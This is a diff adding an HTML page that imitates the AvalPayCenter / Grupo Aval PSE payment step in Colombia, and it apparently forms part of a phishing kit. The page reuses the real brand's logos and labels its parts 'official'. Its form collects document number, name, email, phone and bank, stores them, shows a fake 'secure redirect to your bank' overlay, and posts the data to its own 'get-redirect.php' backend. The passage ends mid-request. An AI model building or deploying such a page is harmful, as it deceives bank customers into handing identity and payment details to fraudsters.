@@ -1,0 +1,1045 @@
+<!DOCTYPE html>
+<html lang="es-co">
+<head>
+    <meta charset="utf-8">
+    <title>Realiza tu pago seguro - AvalPayCenter</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="icon" type="image/x-icon" href="assets/icons/favicon.ico">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Jost:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.774a111d667e5e5e.css">
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: 'Plus Jakarta Sans', Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #f7fafc;
+            color: #002449;
+        }
+
+        /* Contenedor Principal */
+        .pse-main-container {
+            max-width: 1120px;
+            margin: 28px auto 60px;
+            padding: 0 16px;
+        }
+
+        .pse-title-wrapper {
+            margin-bottom: 24px;
+        }
+
+        .pse-title-wrapper h1 {
+            font-size: 28px;
+            font-weight: 800;
+            color: #002449;
+            margin: 0 0 8px 0;
+        }
+
+        .pse-layout-grid {
+            display: grid;
+            grid-template-columns: 290px 1fr;
+            gap: 32px;
+            align-items: start;
+        }
+
+        @media (max-width: 860px) {
+            .pse-layout-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* Stepper Lateral Izquierdo */
+        .stepper-card {
+            background: transparent;
+        }
+
+        .stepper-item {
+            display: flex;
+            align-items: flex-start;
+            position: relative;
+            padding-bottom: 28px;
+        }
+
+        .stepper-item:not(:last-child)::before {
+            content: "";
+            position: absolute;
+            left: 17px;
+            top: 36px;
+            width: 2px;
+            height: calc(100% - 32px);
+            background-color: #cbd5e1;
+        }
+
+        .stepper-item.done:not(:last-child)::before {
+            background-color: #009340;
+        }
+
+        .stepper-circle {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 15px;
+            font-weight: 700;
+            margin-right: 14px;
+            flex-shrink: 0;
+            z-index: 2;
+        }
+
+        .stepper-item.done .stepper-circle {
+            background-color: #009340;
+            color: #ffffff;
+        }
+
+        .stepper-item.doing .stepper-circle {
+            background-color: #002d72;
+            color: #ffffff;
+            box-shadow: 0 0 0 4px rgba(0, 45, 114, 0.15);
+        }
+
+        .stepper-item.pending .stepper-circle {
+            background-color: #ffffff;
+            color: #64748b;
+            border: 2px solid #cbd5e1;
+        }
+
+        .stepper-content {
+            padding-top: 6px;
+        }
+
+        .stepper-headline {
+            font-size: 15px;
+            font-weight: 700;
+            color: #002449;
+            margin-bottom: 4px;
+        }
+
+        .stepper-item.pending .stepper-headline {
+            color: #64748b;
+        }
+
+        .stepper-desc {
+            font-size: 12.5px;
+            color: #64748b;
+            line-height: 1.45;
+        }
+
+        /* Columna Derecha: Tarjeta de Resumen y Formulario */
+        .payment-content-card {
+            background: #ffffff;
+            border-radius: 20px;
+            box-shadow: 0 4px 20px rgba(0, 36, 73, 0.06);
+            padding: 32px;
+            border: 1px solid #e2e8f0;
+        }
+
+        /* Resumen de Transacción */
+        .summary-header-box {
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 14px;
+            padding: 20px 24px;
+            margin-bottom: 28px;
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: space-between;
+            gap: 18px;
+        }
+
+        .summary-service-info {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .summary-service-logo {
+            width: 52px;
+            height: 52px;
+            border-radius: 10px;
+            object-fit: contain;
+            background: #ffffff;
+            border: 1px solid #e2e8f0;
+            padding: 4px;
+        }
+
+        .summary-service-texts h3 {
+            margin: 0;
+            font-size: 17px;
+            font-weight: 700;
+            color: #002449;
+        }
+
+        .summary-service-texts p {
+            margin: 4px 0 0 0;
+            font-size: 13px;
+            color: #64748b;
+        }
+
+        .summary-amount-badge {
+            background: #eef6fc;
+            border: 1px solid #cce5ff;
+            border-radius: 12px;
+            padding: 10px 18px;
+            text-align: right;
+        }
+
+        .summary-amount-badge span {
+            display: block;
+            font-size: 11.5px;
+            font-weight: 600;
+            color: #002d72;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .summary-amount-badge strong {
+            display: block;
+            font-size: 22px;
+            font-weight: 800;
+            color: #002d72;
+            margin-top: 2px;
+        }
+
+        /* Banner PSE Oficial */
+        .pse-banner-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: #ffffff;
+            border: 1.5px solid #002d72;
+            border-radius: 12px;
+            padding: 14px 20px;
+            margin-bottom: 28px;
+        }
+
+        .pse-banner-left {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .pse-banner-left img {
+            height: 38px;
+            width: auto;
+        }
+
+        .pse-banner-texts h4 {
+            margin: 0;
+            font-size: 15px;
+            font-weight: 700;
+            color: #002449;
+        }
+
+        .pse-banner-texts p {
+            margin: 2px 0 0;
+            font-size: 12.5px;
+            color: #475569;
+        }
+
+        /* Tabs Persona Natural / Jurídica */
+        .person-type-tabs {
+            display: flex;
+            background: #f1f5f9;
+            border-radius: 10px;
+            padding: 4px;
+            margin-bottom: 24px;
+            max-width: 360px;
+        }
+
+        .person-tab-btn {
+            flex: 1;
+            background: transparent;
+            border: none;
+            padding: 10px 14px;
+            font-size: 13.5px;
+            font-weight: 600;
+            color: #64748b;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .person-tab-btn.active {
+            background: #ffffff;
+            color: #002449;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.06);
+        }
+
+        /* Formulario Grid */
+        .pse-form-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 18px 22px;
+            margin-bottom: 28px;
+        }
+
+        @media (max-width: 640px) {
+            .pse-form-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .form-col-full {
+            grid-column: 1 / -1;
+        }
+
+        /* Floating Input Containers */
+        .apc-field-group {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .apc-floating-box {
+            position: relative;
+            width: 100%;
+            height: 48px;
+        }
+
+        .apc-custom-input,
+        .apc-custom-select {
+            width: 100%;
+            height: 48px;
+            border: 1.5px solid #cbd5e1;
+            border-radius: 8px;
+            padding: 12px 14px;
+            font-size: 14.5px;
+            color: #002449;
+            background: #ffffff;
+            outline: none;
+            transition: all 0.2s ease;
+            box-sizing: border-box;
+        }
+
+        .apc-custom-select {
+            cursor: pointer;
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath fill='%23002449' d='M1.41 0L6 4.58 10.59 0 12 1.41l-6 6-6-6z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 14px center;
+            padding-right: 36px;
+        }
+
+        .apc-custom-input:focus,
+        .apc-custom-select:focus {
+            border-color: #002d72;
+            box-shadow: 0 0 0 3px rgba(93, 186, 235, 0.25);
+        }
+
+        .apc-floating-label {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 14px;
+            color: #64748b;
+            background: transparent;
+            padding: 0 4px;
+            pointer-events: none;
+            transition: all 0.2s ease;
+        }
+
+        .apc-custom-input:focus ~ .apc-floating-label,
+        .apc-custom-input.has-value ~ .apc-floating-label,
+        .apc-floating-box.select-focused .apc-floating-label,
+        .apc-floating-box.select-has-value .apc-floating-label {
+            top: -9px;
+            transform: translateY(0);
+            font-size: 11.5px;
+            font-weight: 700;
+            color: #002d72;
+            background: #ffffff;
+        }
+
+        .field-error-msg {
+            color: #e62f27;
+            font-size: 11.5px;
+            margin-top: 4px;
+            display: none;
+        }
+
+        /* Botones de acción */
+        .pse-actions-row {
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            gap: 16px;
+            padding-top: 14px;
+            border-top: 1px solid #f1f5f9;
+        }
+
+        .btn-pse-back {
+            background: transparent;
+            border: 1.5px solid #cbd5e1;
+            color: #002449;
+            font-size: 14.5px;
+            font-weight: 700;
+            padding: 12px 28px;
+            border-radius: 24px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .btn-pse-back:hover {
+            border-color: #002449;
+            background: #f8fafc;
+        }
+
+        .btn-pse-submit {
+            background: #002d72;
+            color: #ffffff;
+            border: none;
+            font-size: 15px;
+            font-weight: 700;
+            padding: 12px 36px;
+            border-radius: 24px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 14px rgba(0, 45, 114, 0.2);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn-pse-submit:hover {
+            background: #001d4a;
+            transform: translateY(-1px);
+        }
+
+        /* Pantalla oficial de Carga antes de cambiar de sitio (apc-loading) */
+        .apc-official-loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0, 36, 73, 0.65);
+            backdrop-filter: blur(4px);
+            z-index: 9999999;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 24px;
+            box-sizing: border-box;
+            color: #ffffff;
+        }
+
+        .apc-loading-card {
+            background: #ffffff;
+            border-radius: 28px;
+            padding: 42px 48px;
+            max-width: 520px;
+            width: 92%;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.35);
+            color: #002449;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .apc-loading-spinner-img {
+            width: 90px;
+            height: 90px;
+            margin-bottom: 22px;
+        }
+
+        .apc-loading-card h2 {
+            margin: 0 0 12px 0;
+            font-size: 22px;
+            font-weight: 800;
+            color: #002449;
+        }
+
+        .apc-loading-card p.loading-redirect-msg {
+            margin: 0 0 18px 0;
+            font-size: 15px;
+            color: #334155;
+            line-height: 1.5;
+        }
+
+        .apc-loading-bank-pill {
+            background: #eef6fc;
+            border: 1px solid #cce5ff;
+            border-radius: 20px;
+            padding: 8px 18px;
+            font-size: 14px;
+            font-weight: 700;
+            color: #002d72;
+            margin-bottom: 22px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .apc-loading-warning {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: #fff8f0;
+            border: 1px solid #ffd8a8;
+            border-radius: 12px;
+            padding: 10px 14px;
+            font-size: 12px;
+            color: #b35300;
+            text-align: left;
+            width: 100%;
+        }
+
+        .apc-loading-warning span.icon-warn {
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            background: #ff6a13;
+            color: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            font-size: 13px;
+            flex-shrink: 0;
+        }
+
+        /* Notificación de guardado */
+        .save-indicator-badge {
+            margin-top: 18px;
+            font-size: 11.5px;
+            color: #009340;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+    </style>
+
+<style id="apc-anti-flash">
+/* Evitar flash de contenido por defecto antes de cargar el convenio correcto */
+html.apc-loading body { visibility: hidden; }
+</style>
+<script>
+document.documentElement.classList.add('apc-loading');
+window.addEventListener('load', function() {
+    setTimeout(function(){ document.documentElement.classList.remove('apc-loading'); }, 120);
+});
+/* Fallback por si load tarda demasiado */
+setTimeout(function(){ document.documentElement.classList.remove('apc-loading'); }, 2500);
+</script>
+</head>
+<body>
+
+    <!-- Header oficial -->
+    <apc-header class="header-container">
+        <div class="header-content" style="height:60px;max-width:1116px;padding:0 12px;margin:auto;display:flex;justify-content:space-between;align-items:center;">
+            <div class="header-images" style="display:flex;align-items:center;gap:12px;">
+                <div class="header-images-logo" style="width:7rem;">
+                    <a href="index.html">
+                        <img src="assets/images/logo-avalpay-center.webp" alt="AvalPay Center" style="max-height:36px;width:auto;display:block;">
+                    </a>
+                </div>
+                <div style="border-left:1px dotted #002449;height:24px;margin:0 4px;"></div>
+                <div class="header-images-logos" style="width:7rem;">
+                    <img src="assets/images/logo-grupo-aval.svg" alt="Grupo Aval" style="max-height:28px;width:auto;display:block;">
+                </div>
+            </div>
+            <div>
+                <a href="index.html" style="font-size:14px;font-weight:700;color:#002d72;text-decoration:none;">Volver al Inicio</a>
+            </div>
+        </div>
+    </apc-header>
+
+    <!-- Contenido Principal -->
+    <main class="pse-main-container">
+        <div class="pse-title-wrapper">
+            <h1>Realiza tu pago</h1>
+            <div style="display:flex;gap:4px;height:4px;width:120px;border-radius:2px;overflow:hidden;">
+                <div style="flex:1;background:#002449;"></div>
+                <div style="flex:1;background:#e62f27;"></div>
+                <div style="flex:1;background:#5dbaeb;"></div>
+                <div style="flex:1;background:#009340;"></div>
+            </div>
+        </div>
+
+        <div class="pse-layout-grid">
+            <!-- Stepper oficial -->
+            <aside class="stepper-card">
+                <div class="stepper-item done">
+                    <div class="stepper-circle">✓</div>
+                    <div class="stepper-content">
+                        <div class="stepper-headline">Datos de tu pago</div>
+                        <div class="stepper-desc">Información del servicio y valor ingresado.</div>
+                    </div>
+                </div>
+
+                <div class="stepper-item doing">
+                    <div class="stepper-circle">2</div>
+                    <div class="stepper-content">
+                        <div class="stepper-headline">Realiza tu pago seguro</div>
+                        <div class="stepper-desc">Ingresa tus datos y selecciona tu entidad bancaria para continuar con el pago por PSE.</div>
+                    </div>
+                </div>
+
+                <div class="stepper-item pending">
+                    <div class="stepper-circle">3</div>
+                    <div class="stepper-content">
+                        <div class="stepper-headline">Recibe tu comprobante</div>
+                        <div class="stepper-desc">Confirmación y soporte oficial de la transacción.</div>
+                    </div>
+                </div>
+            </aside>
+
+            <!-- Sección de Formulario PSE y Resumen -->
+            <section class="payment-content-card">
+                <!-- Resumen de transacción -->
+                <div class="summary-header-box">
+                    <div class="summary-service-info">
+                        <img id="pse-service-logo" class="summary-service-logo" src="https://www.avalpaycenter.com/assets/icons/agreement-default.svg" alt="Servicio">
+                        <div class="summary-service-texts">
+                            <h3 id="pse-service-name">Cargando convenio...</h3>
+                            <p>Referencia / Factura: <strong id="pse-service-ref" style="color:#002449;">--</strong></p>
+                        </div>
+                    </div>
+                    <div class="summary-amount-badge">
+                        <span>Valor de la transacción</span>
+                        <strong id="pse-service-amount">$ 0</strong>
+                    </div>
+                </div>
+
+                <!-- Banner PSE -->
+                <div class="pse-banner-bar">
+                    <div class="pse-banner-left">
+                        <img src="https://www.avalpaycenter.com/assets/icons/logo-pse.svg" alt="PSE Pagos Seguros en Línea">
+                        <div class="pse-banner-texts">
+                            <h4>Pagos Seguros en Línea (PSE)</h4>
+                            <p>Realiza tu débito directo desde la cuenta corriente o de ahorros de cualquier banco.</p>
+                        </div>
+                    </div>
+                    <img src="https://www.avalpaycenter.com/assets/icons/logo-aval.svg" alt="Grupo Aval" style="height:28px;opacity:0.85;">
+                </div>
+
+                <!-- Selector Persona Natural / Jurídica -->
+                <div class="person-type-tabs">
+                    <button type="button" class="person-tab-btn active" id="tab-natural" onclick="setPersonType('natural')">Persona natural</button>
+                    <button type="button" class="person-tab-btn" id="tab-juridica" onclick="setPersonType('juridica')">Persona jurídica</button>
+                </div>
+
+                <!-- Formulario -->
+                <form id="pse-payer-form" novalidate onsubmit="return handlePseSubmit(event)">
+                    <div class="pse-form-grid">
+                        <!-- Tipo de documento -->
+                        <div class="apc-field-group">
+                            <div class="apc-floating-box select-has-value" id="box-doc-type">
+                                <select class="apc-custom-select" id="pse-doc-type" required onchange="handleSelectChange(this, 'box-doc-type')">
+                                    <option value="CC" selected>Cédula de ciudadanía</option>
+                                    <option value="CE">Cédula de extranjería</option>
+                                    <option value="NIT">NIT (Número de Identificación Tributaria)</option>
+                                    <option value="PP">Pasaporte</option>
+                                    <option value="TI">Tarjeta de identidad</option>
+                                </select>
+                                <label class="apc-floating-label" for="pse-doc-type">Tipo de documento *</label>
+                            </div>
+                        </div>
+
+                        <!-- Número de documento -->
+                        <div class="apc-field-group">
+                            <div class="apc-floating-box" id="box-doc-number">
+                                <input type="text" class="apc-custom-input" id="pse-doc-number" placeholder="" required autocomplete="off" oninput="handleInputChange(this)">
+                                <label class="apc-floating-label" for="pse-doc-number">Número de documento *</label>
+                            </div>
+                            <span class="field-error-msg" id="err-doc-number">Este campo es obligatorio</span>
+                        </div>
+
+                        <!-- Nombres y Apellidos / Razón Social -->
+                        <div class="apc-field-group form-col-full">
+                            <div class="apc-floating-box" id="box-full-name">
+                                <input type="text" class="apc-custom-input" id="pse-full-name" placeholder="" required autocomplete="off" oninput="handleInputChange(this)">
+                                <label class="apc-floating-label" id="lbl-full-name" for="pse-full-name">Nombres y apellidos del titular *</label>
+                            </div>
+                            <span class="field-error-msg" id="err-full-name">Ingresa el nombre completo</span>
+                        </div>
+
+                        <!-- Correo Electrónico Registrado en PSE -->
+                        <div class="apc-field-group">
+                            <div class="apc-floating-box" id="box-email">
+                                <input type="email" class="apc-custom-input" id="pse-email" placeholder="" required autocomplete="off" oninput="handleInputChange(this)">
+                                <label class="apc-floating-label" for="pse-email">Correo registrado en PSE *</label>
+                            </div>
+                            <span class="field-error-msg" id="err-email">Ingresa un correo electrónico válido</span>
+                        </div>
+
+                        <!-- Teléfono Celular -->
+                        <div class="apc-field-group">
+                            <div class="apc-floating-box" id="box-phone">
+                                <input type="tel" class="apc-custom-input" id="pse-phone" placeholder="" required autocomplete="off" maxlength="10" oninput="handleInputChange(this)">
+                                <label class="apc-floating-label" for="pse-phone">Número de celular *</label>
+                            </div>
+                            <span class="field-error-msg" id="err-phone">Ingresa tu número de celular</span>
+                        </div>
+
+                        <!-- Selector Oficial de Banco -->
+                        <div class="apc-field-group form-col-full">
+                            <div class="apc-floating-box" id="box-bank">
+                                <select class="apc-custom-select" id="pse-bank-select" required onchange="handleBankChange(this)">
+                                    <option value="" disabled selected>A continuación seleccione su banco</option>
+                                    <option value="BANCOLOMBIA">BANCOLOMBIA</option>
+                                    <option value="BANCO DE BOGOTA">BANCO DE BOGOTA</option>
+                                    <option value="BANCO DAVIVIENDA">BANCO DAVIVIENDA</option>
+                                    <option value="BANCO DE OCCIDENTE">BANCO DE OCCIDENTE</option>
+                                    <option value="BANCO POPULAR">BANCO POPULAR</option>
+                                    <option value="BANCO AV VILLAS">BANCO AV VILLAS</option>
+                                    <option value="BANCO BBVA COLOMBIA S.A.">BANCO BBVA COLOMBIA S.A.</option>
+                                    <option value="BANCO ITAU">BANCO ITAU</option>
+                                    <option value="NEQUI">NEQUI</option>
+                                    <option value="DAVIPLATA">DAVIPLATA</option>
+                                    <option value="LULO BANK">LULO BANK</option>
+                                    <option value="DALE!">DALE!</option>
+                                    <option value="NU COLOMBIA (NUBANK)">NU COLOMBIA (NUBANK)</option>
+                                    <option value="SCOTIABANK COLPATRIA">SCOTIABANK COLPATRIA</option>
+                                    <option value="BANCO CAJA SOCIAL">BANCO CAJA SOCIAL</option>
+                                    <option value="BANCO FALABELLA">BANCO FALABELLA</option>
+                                    <option value="BANCO GNB SUDAMERIS">BANCO GNB SUDAMERIS</option>
+                                    <option value="BANCO SANTANDER COLOMBIA">BANCO SANTANDER COLOMBIA</option>
+                                    <option value="BANCO PICHINCHA S.A.">BANCO PICHINCHA S.A.</option>
+                                    <option value="BANCO AGRARIO">BANCO AGRARIO</option>
+                                    <option value="BANCO SERFINANZA">BANCO SERFINANZA</option>
+                                    <option value="BANCO COOPERATIVO COOPCENTRAL">BANCO COOPERATIVO COOPCENTRAL</option>
+                                    <option value="BANCOOMEVA">BANCOOMEVA</option>
+                                    <option value="BANCO FINANDINA S.A. BIC">BANCO FINANDINA S.A. BIC</option>
+                                    <option value="BANCO CREDIFINANCIERA">BANCO CREDIFINANCIERA</option>
+                                    <option value="BANCO UNION">BANCO UNION</option>
+                                    <option value="CONFIAR COOPERATIVA FINANCIERA">CONFIAR COOPERATIVA FINANCIERA</option>
+                                    <option value="CFA COOPERATIVA FINANCIERA">CFA COOPERATIVA FINANCIERA</option>
+                                    <option value="COOFINEP COOPERATIVA FINANCIERA">COOFINEP COOPERATIVA FINANCIERA</option>
+                                    <option value="COOTRAFA">COOTRAFA</option>
+                                    <option value="RAPPIPAY">RAPPIPAY</option>
+                                    <option value="MOVII">MOVII</option>
+                                    <option value="IRIS">IRIS</option>
+                                    <option value="UALA">UALA</option>
+                                    <option value="COLTEFINANCIERA">COLTEFINANCIERA</option>
+                                    <option value="CITIBANK">CITIBANK</option>
+                                </select>
+                                <label class="apc-floating-label" for="pse-bank-select">Selecciona el banco *</label>
+                            </div>
+                            <span class="field-error-msg" id="err-bank">Por favor selecciona un banco</span>
+                        </div>
+                    </div>
+
+                    <!-- Verificación de seguridad Cloudflare Turnstile -->
+                    <div style="margin-top:16px;">
+                        <div id="cf-turnstile-pse" class="cf-turnstile" data-sitekey="0x4AAAAAAF13330GAAP9crj1" data-callback="onCfPse" data-expired-callback="onCfPseExpired" data-error-callback="onCfPseExpired"></div>
+                        <div id="cf-pse-error" style="display:none;color:#e62f27;font-size:12px;margin-top:6px;">Completa la verificación de seguridad para continuar</div>
+                    </div>
+
+                    <!-- Fila de Acciones -->
+                    <div class="pse-actions-row">
+                        <button type="button" class="btn-pse-back" onclick="history.back()">Volver</button>
+                        <button type="submit" class="btn-pse-submit" id="btn-pse-submit">
+                            <span>Pagar con PSE</span>
+                            <span style="font-size:18px;">➔</span>
+                        </button>
+                    </div>
+                </form>
+            </section>
+        </div>
+    </main>
+
+    <!-- Pantalla Oficial de Carga antes de cambiar de sitio (apc-loading) -->
+    <div id="apc-pse-loading-overlay" class="apc-official-loading-screen">
+        <div class="apc-loading-card">
+            <img class="apc-loading-spinner-img" src="assets/icons/loader-apc.svg" alt="Cargando">
+            <h2>Estamos procesando tu pago</h2>
+            <p class="loading-redirect-msg">Por favor espera mientras te redirigimos de forma segura a la entidad financiera a través de PSE.</p>
+            
+            <div class="apc-loading-bank-pill">
+                <span>Entidad:</span>
+                <strong id="loading-selected-bank">Bancolombia</strong>
+            </div>
+
+            <div class="apc-loading-warning">
+                <span class="icon-warn">!</span>
+                <div>Por favor, no cierres, actualices ni uses el botón atrás de esta ventana mientras confirmamos la conexión bancaria.</div>
+            </div>
+
+            <div class="save-indicator-badge">
+                <span>✓</span>
+                <span id="save-status-text">Datos de transacción guardados en el proyecto local</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Script de lógica e interacción -->
+    <script>
+        var currentPersonType = 'natural';
+        var transactionData = {
+            idConv: '',
+            name: '',
+            ref: '',
+            amount: 0,
+            amountFormatted: '$ 0',
+            logo: '',
+            ticketId: 'APC-' + Math.floor(100000 + Math.random() * 900000),
+            date: new Date().toLocaleString('es-CO')
+        };
+
+        // Leer parámetros de URL o sessionStorage
+        function initPageData() {
+            var params = new URLSearchParams(window.location.search);
+            var stored = null;
+            try {
+                stored = JSON.parse(sessionStorage.getItem('apc_pending_payment') || '{}');
+            } catch(e) {}
+
+            transactionData.idConv = params.get('idConv') || (stored && stored.idConv) || '00007206';
+            transactionData.name = params.get('name') || (stored && stored.name) || 'ASEO BOGOTA';
+            transactionData.ref = params.get('ref') || (stored && stored.ref) || '1020304050';
+            
+            var amt = parseInt(params.get('amount') || (stored && stored.amount) || '185000', 10);
+            if (isNaN(amt) || amt <= 0) amt = 185000;
+            transactionData.amount = amt;
+            transactionData.amountFormatted = new Intl.NumberFormat('es-CO', { style: 'currency', currency: 'COP', maximumFractionDigits: 0 }).format(amt);
+            transactionData.logo = params.get('logo') || (stored && stored.logo) || 'https://www.avalpaycenter.com/assets/icons/agreement-default.svg';
+
+            // Pintar en interfaz
+            var nameEl = document.getElementById('pse-service-name');
+            var refEl = document.getElementById('pse-service-ref');
+            var amtEl = document.getElementById('pse-service-amount');
+            var logoEl = document.getElementById('pse-service-logo');
+
+            if (nameEl) nameEl.innerText = transactionData.name;
+            if (refEl) refEl.innerText = transactionData.ref;
+            if (amtEl) amtEl.innerText = transactionData.amountFormatted;
+            if (logoEl && transactionData.logo) logoEl.src = transactionData.logo;
+        }
+
+        // Toggle Persona Natural / Jurídica
+        function setPersonType(type) {
+            currentPersonType = type;
+            var tabN = document.getElementById('tab-natural');
+            var tabJ = document.getElementById('tab-juridica');
+            var lblName = document.getElementById('lbl-full-name');
+            var selectDoc = document.getElementById('pse-doc-type');
+
+            if (type === 'natural') {
+                if (tabN) tabN.classList.add('active');
+                if (tabJ) tabJ.classList.remove('active');
+                if (lblName) lblName.innerText = 'Nombres y apellidos del titular *';
+                if (selectDoc) selectDoc.value = 'CC';
+            } else {
+                if (tabJ) tabJ.classList.add('active');
+                if (tabN) tabN.classList.remove('active');
+                if (lblName) lblName.innerText = 'Razón social de la empresa *';
+                if (selectDoc) selectDoc.value = 'NIT';
+            }
+        }
+
+        // Floating labels helpers
+        function handleInputChange(input) {
+            if (input.value && input.value.trim().length > 0) {
+                input.classList.add('has-value');
+            } else {
+                input.classList.remove('has-value');
+            }
+            var errEl = document.getElementById('err-' + input.id.replace('pse-', ''));
+            if (errEl) errEl.style.display = 'none';
+        }
+
+        function handleSelectChange(select, boxId) {
+            var box = document.getElementById(boxId);
+            if (box) {
+                if (select.value) {
+                    box.classList.add('select-has-value');
+                } else {
+                    box.classList.remove('select-has-value');
+                }
+            }
+        }
+
+        function handleBankChange(select) {
+            var box = document.getElementById('box-bank');
+            var errBank = document.getElementById('err-bank');
+            if (select.value) {
+                if (box) box.classList.add('select-has-value');
+                if (errBank) errBank.style.display = 'none';
+            } else {
+                if (box) box.classList.remove('select-has-value');
+            }
+        }
+
+        // Envío del formulario PSE y Pantalla de Carga
+        function showPseResultMessage(msg) {
+            var overlay = document.getElementById('apc-pse-loading-overlay');
+            if (!overlay) { alert(msg); return; }
+            var spinner = overlay.querySelector('.apc-loading-spinner-img');
+            if (spinner) spinner.style.display = 'none';
+            var title = overlay.querySelector('h2');
+            if (title) title.innerText = 'Aviso de pago';
+            var redirectMsg = overlay.querySelector('.loading-redirect-msg');
+            if (redirectMsg) redirectMsg.innerText = msg;
+            var warn = overlay.querySelector('.apc-loading-warning');
+            if (warn) warn.style.display = 'none';
+            var badge = overlay.querySelector('.save-indicator-badge');
+            if (badge) badge.style.display = 'none';
+            if (!document.getElementById('btn-pse-overlay-close')) {
+                var btn = document.createElement('button');
+                btn.id = 'btn-pse-overlay-close';
+                btn.type = 'button';
+                btn.innerText = 'Entendido';
+                btn.style.cssText = 'margin-top:16px;padding:12px 24px;background:#2563eb;color:#fff;border:none;border-radius:8px;font-weight:700;cursor:pointer;width:100%;';
+                btn.onclick = function() { overlay.style.display = 'none'; };
+                var card = overlay.querySelector('.apc-loading-card');
+                if (card) card.appendChild(btn);
+            }
+        }
+
+        function handlePseSubmit(e) {
+            e.preventDefault();
+
+            var docNum = document.getElementById('pse-doc-number').value.trim();
+            var fullName = document.getElementById('pse-full-name').value.trim();
+            var email = document.getElementById('pse-email').value.trim();
+            var phone = document.getElementById('pse-phone').value.trim();
+            var bankSelect = document.getElementById('pse-bank-select');
+            var bankVal = bankSelect ? bankSelect.value : '';
+
+            var hasError = false;
+
+            if (!docNum) {
+                document.getElementById('err-doc-number').style.display = 'block';
+                hasError = true;
+            }
+            if (!fullName) {
+                document.getElementById('err-full-name').style.display = 'block';
+                hasError = true;
+            }
+            if (!email || !email.includes('@') || !email.includes('.')) {
+                document.getElementById('err-email').style.display = 'block';
+                hasError = true;
+            }
+            if (!phone || phone.length < 7) {
+                document.getElementById('err-phone').style.display = 'block';
+                hasError = true;
+            }
+            if (!bankVal) {
+                document.getElementById('err-bank').style.display = 'block';
+                hasError = true;
+            }
+
+            if (hasError) return false;
+
+            // Validar captcha real Cloudflare Turnstile
+            if (!window._cfTokenPse) {
+                var cfErrPse = document.getElementById('cf-pse-error');
+                if (cfErrPse) cfErrPse.style.display = 'block';
+                var cfBoxPse = document.getElementById('cf-turnstile-pse');
+                if (cfBoxPse && cfBoxPse.scrollIntoView) cfBoxPse.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                return false;
+            }
+
+            // Compilar registro completo de la transacción
+            var fullRecord = {
+                ticketId: transactionData.ticketId,
+                date: new Date().toISOString(),
+                localDate: new Date().toLocaleString('es-CO'),
+                service: transactionData.name,
+                idConv: transactionData.idConv,
+                ref: transactionData.ref,
+                amount: transactionData.amount,
+                amountFormatted: transactionData.amountFormatted,
+                personType: currentPersonType,
+                docType: document.getElementById('pse-doc-type').value,
+                docNumber: docNum,
+                fullName: fullName,
+                email: email,
+                phone: phone,
+                bank: bankVal,
+                status: 'REDIRECTING_TO_BANK'
+            };
+
+            // Guardar en localStorage / sessionStorage del proyecto local
+            try {
+                localStorage.setItem('apc_last_pse_transaction', JSON.stringify(fullRecord));
+                sessionStorage.setItem('apc_last_pse_transaction', JSON.stringify(fullRecord));
+                
+                // Guardar histórico
+                var history = JSON.parse(localStorage.getItem('apc_transactions_history') || '[]');
+                history.unshift(fullRecord);
+                localStorage.setItem('apc_transactions_history', JSON.stringify(history.slice(0, 50)));
+            } catch(ex) {
+                console.error('Error saving transaction record:', ex);
+            }
+
+            // Desplegar pantalla oficial de carga antes de cambiar de sitio
+            var loadingOverlay = document.getElementById('apc-pse-loading-overlay');
+            var bankPill = document.getElementById('loading-selected-bank');
+            if (bankPill) bankPill.innerText = bankVal;
+            if (loadingOverlay) loadingOverlay.style.display = 'flex';
+
+            // Invocar backend (compatible con PHP local y Vercel)
+            var apiEndpoint = 'get-redirect.php';
+            fetch(apiEndpoint, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
